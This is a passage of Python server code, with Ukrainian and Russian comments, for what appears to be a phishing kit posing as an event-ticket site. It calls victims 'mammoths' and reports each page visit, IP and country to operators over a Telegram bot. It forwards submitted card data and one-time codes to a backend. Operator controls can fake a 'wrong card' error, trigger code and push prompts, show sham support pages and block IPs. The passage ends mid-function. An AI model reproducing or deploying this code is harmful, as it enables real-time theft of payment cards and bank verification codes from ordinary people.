            print(f"[DEBUG] 📱 Надсилаємо лог event creator: {extra_user_id}")
            
            # Логуємо з російською назвою "Ввод карты" в потрібному форматі
            message = (
                f"🔔Мамонт открыл страницу\n\n"
                f"📎Страница: Ввод карты\n"
                f"#️⃣Ссылка: ?page={page_code}\n"
                f"📶IP: {ip}\n"
                f"🌎Страна: {country}"
            )
            
            # Надсилаємо event creator
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                data = {"chat_id": extra_user_id, "text": message}
                response = requests.post(url, data=data, timeout=1)
                if response.status_code == 200:
                    print(f"✅ Лог надіслано event creator {extra_user_id}")
                    print(f"📝 Повідомлення: {message}")
                else:
                    print(f"❌ Помилка надсилання: {response.status_code}")
            except Exception as e:
                print(f"❌ Помилка надсилання event creator: {e}")
        # НЕ логуємо сторінку введення карти - вже залоговано вище
        
        # Логуємо інші сторінки для event creator (НЕ сторінку введення карти, НЕ Telegram)
        if extra_user_id and should_log and page_code and '/buy-tickets/loading/' not in norm_path and not is_telegram:
                # Отримуємо назву сторінки
                page_name = get_page_name(norm_path)
                
                # Формуємо лог у потрібному форматі
                message = (
                    f"🔔Мамонт открыл страницу\n\n"
                    f"📎Страница: {page_name}\n"
                    f"#️⃣Ссылка: ?page={page_code}\n"
                    f"📶IP: {ip}\n"
                    f"🌎Страна: {country}"
                )
                
                # Надсилаємо event creator
                try:
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                    data = {"chat_id": extra_user_id, "text": message}
                    requests.post(url, data=data, timeout=1)
                    print(f"📤 Лог надіслано event creator {extra_user_id} для сторінки: {page_name}")
                except Exception as e:
                    print(f"❌ Помилка надсилання event creator: {e}")
        elif is_telegram:
            pass  # Не логуємо Telegram запити
        elif extra_user_id and not should_log:
            pass  # Не логуємо не-сторінки
        elif extra_user_id and not page_code:
            pass  # Не логуємо без page_code
        elif should_log and not is_telegram:
            # НЕ логуємо сторінки без page_code в групу З КНОПКАМИ
            # У групі З кнопками мають бути тільки логи з кнопками (карта, код)
            # Логи про перехід по сторінках не надсилаються
            pass
        else:
            pass  # Не логуємо зайві повідомлення
        
        # Якщо це перший перехід на нову сторінку, видаляємо page_code зі списку ігнорування
        if should_ignore_first_visit:
            IGNORE_FIRST_VISIT_PAGE_CODES.discard(page_code)
            # print(f"[IGNORE_FIRST_VISIT] Removed {page_code} from ignore list after first visit")
            # print(f"📊 Поточний список ігнорування: {list(IGNORE_FIRST_VISIT_PAGE_CODES)}")
        # --- Додаємо обробку /check_request_again ---
        if self.path.startswith('/check_request_again'):
            code = qs.get('code', [None])[0]
            if code and REQUEST_AGAIN_FLAGS.get(code):
                REQUEST_AGAIN_FLAGS[code] = False
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        # --- Wrong card polling ---
        if self.path.startswith('/check_wrong_card'):
            ip = qs.get('ip', [None])[0]
            if ip and WRONG_CARD_FLAGS.get(ip):
                WRONG_CARD_FLAGS[ip] = False
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        if self.path.startswith('/check_code_redirect'):
            ip = qs.get('ip', [None])[0]
            if ip and CODE_REDIRECT_FLAGS.get(ip):
                CODE_REDIRECT_FLAGS[ip] = False
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        if self.path.startswith('/get_custom_text'):
            text_id = qs.get('text_id', [None])[0]
            text = CUSTOM_TEXTS.get(text_id, '')
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.end_headers()
            # Повертаємо чистий текст без JSON/лапок
            self.wfile.write((text or '').encode('utf-8'))
            return
        if self.path.startswith('/check_support'):
            # Очищаємо старі флаги
            clear_old_flags()
            
            ip = qs.get('ip', [None])[0]
            current_time = time.time()
            
            # Скидаємо флаги для нових користувачів (якщо IP не був активний в останні 5 хвилин)
            if ip in USER_SESSIONS:
                session_age = current_time - USER_SESSIONS[ip]
                if session_age > 300:  # 5 хвилин
                    if ip in SUPPORT_FLAGS:
                        del SUPPORT_FLAGS[ip]
                        print(f"[check_support] Скинуто флаги для нового сеансу користувача: {ip}")
            else:
                # Якщо це перший раз для цього IP, очищаємо старі флаги
                if ip in SUPPORT_FLAGS:
                    del SUPPORT_FLAGS[ip]
                    print(f"[check_support] Перший раз для IP, очищено флаги: {ip}")
            
            # Оновлюємо час сесії
            USER_SESSIONS[ip] = current_time
            
            flag = SUPPORT_FLAGS.get(ip, {}) if ip else {}
            print(f"[check_support] IP: {ip}, флаги: {flag}")
            
            # Перевіряємо флаг і позначаємо як використаний
            response_data = {
                'show_support': bool(flag.get('support') and not flag.get('used', True)),
                'show_text': bool(flag.get('text_id') and not flag.get('used', True)),
                'text_id': flag.get('text_id', '') if not flag.get('used', True) else ''
            }
            
            # Позначаємо флаг як використаний або видаляємо
            if flag.get('support') or flag.get('text_id'):
                if not flag.get('used', True):
                    # Позначаємо як використаний
                    SUPPORT_FLAGS[ip] = {**flag, 'used': True}
                    print(f"[check_support] Флаг позначено як використаний для IP: {ip}")
                else:
                    # Видаляємо використаний флаг
                    del SUPPORT_FLAGS[ip]
                    print(f"[check_support] Використаний флаг очищено для IP: {ip}")
            
            print(f"[check_support] Відповідь: {response_data}")
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response_data).encode('utf-8'))
            return
        if self.path.startswith('/reset_support_flag'):
            ip = qs.get('ip', [None])[0]
            if ip and ip in SUPPORT_FLAGS:
                del SUPPORT_FLAGS[ip]
                print(f"[reset_support_flag] Cleared support flag for IP: {ip}")
            self.send_response(200)
            self.end_headers()
            self.safe_write(b'ok')
            return
        if self.path.startswith('/check_push'):
            page_code = qs.get('page_code', [None])[0]
            print(f'[check_push] page_code: {page_code}, флаг: {PUSH_FLAGS.get(page_code)}')
            if page_code and page_code in PUSH_FLAGS:
                flag_data = PUSH_FLAGS[page_code]
                if isinstance(flag_data, dict) and not flag_data.get('used', True):
                    # Позначаємо як використаний
                    PUSH_FLAGS[page_code] = {'used': True}
                    print(f'[check_push] Push флаг використано для page_code: {page_code}')
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'true')
                else:
                    # Видаляємо використаний флаг
                    del PUSH_FLAGS[page_code]
                    print(f'[check_push] Push флаг очищено для page_code: {page_code}')
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'false')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        
        # --- API проксування до бекенду ---
        if self.path.startswith('/api/'):
            try:
                # Проксуємо запит до бекенду на порту 8081
                backend_url = f"http://127.0.0.1:8081{self.path}"
                print(f"[API Proxy] Proxying {self.path} to {backend_url}")
                
                response = requests.get(backend_url, timeout=5)
                
                # Копіюємо заголовки відповіді
                self.send_response(response.status_code)
                for header, value in response.headers.items():
                    if header.lower() not in ['transfer-encoding', 'connection']:
                        self.send_header(header, value)
                self.end_headers()
                
                # Відправляємо тіло відповіді
                self.safe_write(response.content)
                return
            except Exception as e:
                print(f"[API Proxy] Error proxying to backend: {e}")
                self.send_error(502, f"Backend Error: {e}")
                return
        
        # --- Endpoint для зміни флагу (GET/POST) ---
        if self.path.startswith('/set_payment_disabled'):
            val = qs.get('value', [None])[0]
            global PAYMENT_DISABLED
            if val == '1':
                PAYMENT_DISABLED = True
                print('[PAYMENT] Disabled')
            elif val == '0':
                PAYMENT_DISABLED = False
                print('[PAYMENT] Enabled')
            self.send_response(200)
            self.end_headers()
            self.safe_write(b'ok')
            return
        # --- Блокування платіжних сторінок ---
        def is_payment_url(path):
            return (
                path.startswith('/buy-tickets/loading/') or
                path.startswith('/buy-tickets/code/') or
                path.startswith('/buy-tickets/loading/waiting-support.html') or
                path.startswith('/buy-tickets/loading/waiting-text.html')
            )

        if PAYMENT_DISABLED and is_payment_url(self.path):
            with open('events-art.com/buy-tickets/payment-unavailable/Site Maintenance.html', 'rb') as f:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.safe_write(f.read())
            return
        if self.path.startswith('/clear_logs'):
            try:
                with open('server.log', 'w') as f:
                    f.truncate(0)
                self.send_response(200)
                self.end_headers()
                self.safe_write(b'ok')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.safe_write(str(e).encode('utf-8'))
            return
        try:
            super().do_GET()
        except BrokenPipeError:
            # Клієнт закрив з'єднання - це нормально, не логуємо
            print(f"[INFO] Client disconnected for {self.path}")
            return
        except ConnectionResetError:
            # Клієнт скинув з'єднання - це нормально, не логуємо
            print(f"[INFO] Connection reset by client for {self.path}")
            return
        except Exception as e:
            # Логуємо помилки в Telegram
            try:
                ip = get_real_ip(self)
                error_msg = (
                    f"🚨 Помилка сервера\n"
                    f"📄 Сторінка: {self.path}\n"
                    f"🌍 IP: {ip}\n"
                    f"❌ Помилка: {e}"
                )
                
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                data = {"chat_id": ADMIN_ID, "text": error_msg}
                requests.post(url, data=data, timeout=2)
            except:
                pass
            
            try:
                self.send_error(500, f"Internal Server Error: {e}")
            except (BrokenPipeError, ConnectionResetError):
                # Клієнт закрив з'єднання під час відправки помилки
                print(f"[INFO] Client disconnected while sending error for {self.path}")
                return

    def send_error(self, code, message=None, explain=None):
        """Перевизначаємо send_error для кращої обробки помилок"""
        try:
            super().send_error(code, message, explain)
        except (BrokenPipeError, ConnectionResetError):
            print(f"[INFO] Client disconnected while sending error {code} for {self.path}")
            return
        except Exception as e:
            print(f"[ERROR] Failed to send error {code}: {e}")
            return

    def safe_send_response(self, code, message=None):
        """Безпечна відправка відповіді з обробкою помилок з'єднання"""
        try:
            self.send_response(code, message)
            self.end_headers()
            return True
        except (BrokenPipeError, ConnectionResetError):
            print(f"[INFO] Client disconnected while sending response {code} for {self.path}")
            return False
        except Exception as e:
            print(f"[ERROR] Failed to send response {code}: {e}")
            return False

    def safe_write(self, data):
        """Безпечний запис даних з обробкою помилок з'єднання"""
        try:
            if isinstance(data, str):
                self.wfile.write(data.encode('utf-8'))
            else:
                self.wfile.write(data)
            return True
        except (BrokenPipeError, ConnectionResetError):
            print(f"[INFO] Client disconnected while writing data for {self.path}")
            return False
        except Exception as e:
            print(f"[ERROR] Failed to write data: {e}")
            return False

    def copyfile(self, source, outputfile):
        """Перевизначаємо copyfile для обробки BrokenPipeError"""
        try:
            return super().copyfile(source, outputfile)
        except (BrokenPipeError, ConnectionResetError):
            print(f"[INFO] Client disconnected during file transfer for {self.path}")
            return
        except Exception as e:
            print(f"[ERROR] Failed to copy file: {e}")
            return

    def do_OPTIONS(self):
        # Обробка CORS preflight запитів
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    @log_function
    def do_POST(self):
        path = unquote(self.path.split('?' ,1)[0])
        # --- Блокування IP ---
        if self.is_blocked():
            self.send_response(403)
            self.end_headers()
            self.safe_write('BLOCKED'.encode('utf-8'))
            return
        
        # --- API проксування до бекенду ---
        if path.startswith('/api/'):
            try:
                # Читаємо тіло запиту
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length) if content_length > 0 else b''
                
                # Проксуємо запит до бекенду на порту 8081
                backend_url = f"http://127.0.0.1:8081{self.path}"
                print(f"[API Proxy POST] Proxying {self.path} to {backend_url}")
                
                # Відправляємо POST запит до бекенду
                response = requests.post(backend_url, data=post_data, headers={
                    'Content-Type': self.headers.get('Content-Type', 'application/json')
                }, timeout=5)
                
                # Копіюємо заголовки відповіді
                self.send_response(response.status_code)
                for header, value in response.headers.items():
                    if header.lower() not in ['transfer-encoding', 'connection']:
                        self.send_header(header, value)
                self.end_headers()
                
                # Відправляємо тіло відповіді
                self.safe_write(response.content)
                return
            except (BrokenPipeError, ConnectionResetError):
                print(f"[INFO] Client disconnected during API proxy for {self.path}")
                return
            except Exception as e:
                print(f"[API Proxy POST] Error proxying to backend: {e}")
                try:
                    self.send_error(502, f"Backend Error: {e}")
                except (BrokenPipeError, ConnectionResetError):
                    print(f"[INFO] Client disconnected while sending error for {self.path}")
                    return
                return
        if path == '/log_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                page = data.get('page', '')
                link = data.get('link', '')
                ip = get_real_ip(self)
                # НЕ логуємо - тільки для event creator на сторінці введення карти
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        # Оновлені обробники POST-запитів для page_code
        elif path == '/submit_form':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                phone = data.get('phone', '')
                name = data.get('name', '')
                mail = data.get('mail', '')
                page_code = data.get('page_code', '')
                user_id = data.get('user_id', '')
                if not page_code and user_id:
                    page_code = get_user_id_by_page_code(user_id)
                ip = get_real_ip(self)
                # Надсилаємо у main.py
                try:
                    requests.post('http://localhost:8081/notify_admin', json={
                        'phone': phone,
                        'name': name,
                        'mail': mail,
                        'ip': ip,
                        'page_code': page_code
                    }, timeout=2)
                except Exception as e:
                    print(f"[notify_admin] Error: {e}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        elif path == '/send_payment_data':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                page_code = data.get('page_code', '')
                user_id = data.get('user_id', '')
                if not page_code and user_id:
                    page_code = get_user_id_by_page_code(user_id)
                # Видаляємо user_id, передаємо тільки page_code
                data.pop('user_id', None)
                data['page_code'] = page_code
                print("[send_payment_data] Отримано дані:", data)
                resp = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=3)
                print(f"[send_payment_data] Відповідь від main.py: {resp.status_code} {resp.text}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print("[send_payment_data] ERROR:", e)
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/send_code':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                print("[send_code] Отримано код:", data)
                
                # Перетворюємо 'page' на 'page_code' для сумісності
                if 'page' in data and 'page_code' not in data:
                    data['page_code'] = data.pop('page')
                    print(f"[send_code] Перетворено 'page' на 'page_code': {data['page_code']}")
                
                # Перетворюємо 'total' на 'price' для сумісності
                if 'total' in data and 'price' not in data:
                    data['price'] = data.pop('total')
                    print(f"[send_code] Перетворено 'total' на 'price': {data['price']}")
                
                resp = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=3)
                print(f"[send_code] Відповідь від main.py: {resp.status_code} {resp.text}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print("[send_code] ERROR:", e)
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/set_request_again':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                code = data.get('code')
                if code:
                    REQUEST_AGAIN_FLAGS[code] = True
                    print(f"[set_request_again] Set flag for code: {code}")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no code')
            except Exception as e:
                print(f"[set_request_again] Error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/ignore_first_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                page_code = data.get('page_code')
                if page_code:
                    add_ignore_first_visit(page_code)
                    print(f"[ignore_first_visit] Added {page_code} to ignore list")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no page_code')
            except Exception as e:
                print(f"[ignore_first_visit] Error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path.startswith('/check_request_again'):
            code = qs.get('code', [None])[0]
            print(f"[check_request_again] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
            if code and REQUEST_AGAIN_FLAGS.get(code):
                REQUEST_AGAIN_FLAGS[code] = False
                print(f"[check_request_again] Returning true for code: {code}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        elif path == '/admin_action':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                action = data.get('action')
                ip = data.get('ip')
                # --- Обробляємо адмін дії ---
                if action in ['block', 'card', 'code'] and ip:
                    # НЕ логуємо - тільки для event creator на сторінці введення карти
                    pass
                if action == 'block' and ip:
                    BLACKLISTED_IPS.add(ip)
                    print(f'[admin_action] Blocked IP: {ip}')
                elif action == 'unblock' and ip:
                    BLACKLISTED_IPS.discard(ip)
                    print(f'[admin_action] Unblocked IP: {ip}')
                elif action == 'card' and ip:
                    WRONG_CARD_FLAGS[ip] = True
                    print(f'[admin_action] Wrong card for IP: {ip}')
                elif action == 'code' and ip:
                    CODE_REDIRECT_FLAGS[ip] = True
                    print(f'[admin_action] Code redirect for IP: {ip}')
                    
                    # Логуємо появу code кнопки в чат
                    try:
                        # Отримуємо page_code та інформацію про подію
                        page_code = data.get('page_code', '')
                        event_info = get_event_info_by_page_code(page_code) if page_code else None
                        
                        # Отримуємо user_id для event creator
                        user_id = None
                        if page_code:
                            try:
                                db = sqlite3.connect('users.db')
                                cur = db.cursor()
                                cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
                                row = cur.fetchone()
                                if row:
                                    user_id = row[0]
                                db.close()
                            except Exception as e:
                                print(f"[admin_action] Error getting user_id: {e}")
                        
                        # Надсилаємо лог про кнопку
                        send_button_log_to_chat('code', ip, page_code, None, event_info)
                        
                        # Також надсилаємо event creator, якщо знайдено
                        if user_id:
                            try:
                                button_msg = f"🔔 Вікно запиту коду з'явилося на вашій сторінці {page_code}\n\n📶 IP: {ip}"
                                if event_info:
                                    button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
                                
                                # Формуємо URL з сумою для code
                                code_url = f"https://artpullse.com/code/?page={page_code}"
                                if event_info and event_info.get('price'):
                                    code_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
                                
                                button_msg += f"\n🔗 URL: {code_url}"
                                
                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                                data_event_creator = {"chat_id": user_id, "text": button_msg}
                                requests.post(url, data=data_event_creator, timeout=1)
                                print(f"📤 Лог про code кнопку надіслано event creator {user_id}")
                            except Exception as e:
                                print(f"[admin_action] Error sending to event creator: {e}")
                                
                    except Exception as e:
                        print(f"[admin_action] Error logging button: {e}")
                    
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print(f'[admin_action] Error: {e}')
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif self.path == '/set_custom_text':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                text_id = data.get('text_id')
                text = data.get('text')
                if text_id and text is not None:
                    CUSTOM_TEXTS[text_id] = text
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no text_id or text')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif self.path == '/set_support_flag':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                ip = data.get('ip')
                flag_type = data.get('type')  # 'support' або 'text'
                text_id = data.get('text_id')
                print(f"[set_support_flag] IP: {ip}, тип: {flag_type}, text_id: {text_id}")
                
                # Очищаємо старі флаги
                clear_old_flags()
                
                # Очищаємо ВСІ старі флаги перед установкой нового
                SUPPORT_FLAGS.clear()
                print(f"[set_support_flag] Очищено всі старі support флаги")
                
                if ip and flag_type == 'support':
                    SUPPORT_FLAGS[ip] = {'support': True, 'used': False}
                    print(f"[set_support_flag] Встановлено support флаг ТІЛЬКИ для IP: {ip}")
                    
                    # Логуємо появу support кнопки в чат
                    try:
                        # Отримуємо page_code та інформацію про подію
                        page_code = data.get('page_code', '')
                        event_info = get_event_info_by_page_code(page_code) if page_code else None
                        
                        # Отримуємо user_id для event creator
                        user_id = None
                        if page_code:
                            try:
                                db = sqlite3.connect('users.db')
                                cur = db.cursor()
                                cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
                                row = cur.fetchone()
                                if row:
                                    user_id = row[0]
                                db.close()
                            except Exception as e:
                                print(f"[set_support_flag] Error getting user_id: {e}")
                        
                        # Надсилаємо лог про кнопку
                        send_button_log_to_chat('support', ip, page_code, None, event_info)
                        
                        # Закоментовано надсилання support-повідомлення event creator
                        # if user_id:
                        #     try:
                        #         button_msg = f"🔔 Сторінка техпідтримки завантажена на вашій сторінці {page_code}\n\n📶 IP: {ip}"
                        #         if event_info:
                        #             button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
                        #         
                        #         # Формуємо URL з сумою для техпідтримки
                        #         support_url = f"https://artpullse.com/support/?page={page_code}"
                        #         if event_info and event_info.get('price'):
                        #             support_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
                        #         
                        #         button_msg += f"\n🔗 URL: {support_url}"
                        #         
                        #         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                        #         data_event_creator = {"chat_id": user_id, "text": button_msg}
                        #         requests.post(url, data=data_event_creator, timeout=1)
                        #         print(f"📤 Лог про support кнопку надіслано event creator {user_id}")
                        #     except Exception as e:
                        #         print(f"[set_support_flag] Error sending to event creator: {e}")
                                
                    except Exception as e:
                        print(f"[set_support_flag] Error logging button: {e}")
                    
                elif ip and flag_type == 'text' and text_id:
                    SUPPORT_FLAGS[ip] = {'text_id': text_id, 'used': False}
                    print(f"[set_support_flag] Встановлено text флаг ТІЛЬКИ для IP: {ip} з text_id: {text_id}")
                    
                    # Логуємо появу text кнопки в чат
                    try:
                        # Отримуємо page_code та інформацію про подію
                        page_code = data.get('page_code', '')
                        event_info = get_event_info_by_page_code(page_code) if page_code else None
                        
                        # Отримуємо user_id для event creator
                        user_id = None
                        if page_code:
                            try:
                                db = sqlite3.connect('users.db')
                                cur = db.cursor()
                                cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
                                row = cur.fetchone()
                                if row:
                                    user_id = row[0]
                                db.close()
                            except Exception as e:
                                print(f"[set_support_flag] Error getting user_id: {e}")
                        
                        # Надсилаємо лог про кнопку
                        send_button_log_to_chat('text', ip, page_code, None, event_info)
                        
                        # Закоментовано надсилання text-повідомлення event creator
                        # if user_id:
                        #     try:
                        #         button_msg = f"🔔 Кнопка з текстом з'явилася на вашій сторінці {page_code}\n\n📶 IP: {ip}"
                        #         if event_info:
                        #             button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
                        #         
                        #         # Формуємо URL з сумою для text
                        #         text_url = f"https://artpullse.com/text/?page={page_code}"
                        #         if event_info and event_info.get('price'):
                        #             text_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
                        #         
                        #         text_url += f"\n🔗 URL: {text_url}"
                        #         
                        #         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                        #         data_event_creator = {"chat_id": user_id, "text": button_msg}
                        #         requests.post(url, data=data_event_creator, timeout=1)
                        #         print(f"📤 Лог про text кнопку надіслано event creator {user_id}")
                        #     except Exception as e:
                        #         print(f"[set_support_flag] Error sending to event creator: {e}")
                                
                    except Exception as e:
                        print(f"[set_support_flag] Error logging button: {e}")
                    
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print(f"[set_support_flag] Помилка: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/update_site_user_ip':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                page_code = data.get('page_code', '')
                user_id = data.get('user_id', '')
                ip = data.get('ip', '')
                if not page_code and user_id:
                    page_code = get_user_id_by_page_code(user_id)
                # Надсилаємо у main.py
                try:
                    requests.post('http://localhost:8081/update_site_user_ip', json={
                        'page_code': page_code,
                        'ip': ip
                    }, timeout=2)
                except Exception as e:
                    print(f"[update_site_user_ip] Error: {e}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
            return
        elif path.startswith('/api/payment_data'):
            page_code = qs.get('page', [None])[0]
            if not page_code:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'{"error": "missing page"}')
                return
            c = get_db().cursor()
            c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
            row = c.fetchone()
            if not row:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'{"error": "not found"}')
                return
            price, currency, street = row
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'price': price, 'currency': currency, 'street': street}).encode('utf-8'))
            return
        elif path == '/set_push_flag':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                page_code = data.get('page_code')
                if page_code:
                    # Очищаємо старі флаги
                    clear_old_flags()
                    # Очищаємо ВСІ старі push флаги перед установкой нового
                    PUSH_FLAGS.clear()
                    print(f'[set_push_flag] Очищено всі старі push флаги')
                    
                    PUSH_FLAGS[page_code] = {'used': False}
                    print(f'[set_push_flag] Встановлено push флаг ТІЛЬКИ для page_code: {page_code}')
                    
                    # Логуємо появу push кнопки в чат
                    try:
                        # Отримуємо IP та інформацію про подію
                        ip = get_real_ip(self)
                        event_info = get_event_info_by_page_code(page_code)
                        
                        # Отримуємо user_id для event creator
                        user_id = None
                        try:
                            db = sqlite3.connect('users.db')
                            cur = db.cursor()
                            cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
                            row = cur.fetchone()
                            if row:
                                user_id = row[0]
                            db.close()
                        except Exception as e:
                            print(f"[set_push_flag] Error getting user_id: {e}")
                        
                        # Надсилаємо лог про кнопку
                        send_button_log_to_chat('push', ip, page_code, None, event_info)
                        
                        # Закоментовано надсилання push-повідомлення event creator
                        # if user_id:
                        #     try:
                        #         button_msg = f"🔔 Push-повідомлення з'явилося на вашій сторінці {page_code}\n\n📶 IP: {ip}"
                        #         if event_info:
                        #             button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
                        #         
                        #         # Формуємо URL з сумою для push-повідомлення
                        #         push_url = f"https://artpullse.com/push/?page={page_code}"
                        #         if event_info and event_info.get('price'):
                        #             push_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
                        #         
                        #         button_msg += f"\n🔗 URL: {push_url}"
                        #         
                        #         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                        #         data_event_creator = {"chat_id": user_id, "text": button_msg}
                        #         requests.post(url, data=data_event_creator, timeout=1)
                        #         print(f"📤 Лог про push кнопку надіслано event creator {user_id}")
                        #     except Exception as e:
                        #         print(f"[set_push_flag] Error sending to event creator: {e}")
                                
                    except Exception as e:
                        print(f"[set_push_flag] Error logging button: {e}")
                    
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no page_code')
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/set_request_again':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                code = data.get('code')
                if code:
                    # Встановлюємо флаг для повторного запиту коду
                    CODE_REDIRECT_FLAGS[code] = True
                    print(f'[set_request_again] Встановлено флаг повторного запиту коду: {code}')
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no code')
            except Exception as e:
                print(f'[set_request_again] Error: {e}')
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return

        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    # Очищаем старые флаги при запуске
    SUPPORT_FLAGS.clear()
    PUSH_FLAGS.clear()
    USER_SESSIONS.clear()
    CUSTOM_TEXTS.clear()
    print("🧹 Очищены старые флаги при запуске сервера")
    
    # Добавляем все существующие page_code в список игнорирования первого лога
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute('SELECT page_code FROM site_users WHERE page_code IS NOT NULL')
        existing_page_codes = [row[0] for row in c.fetchall()]
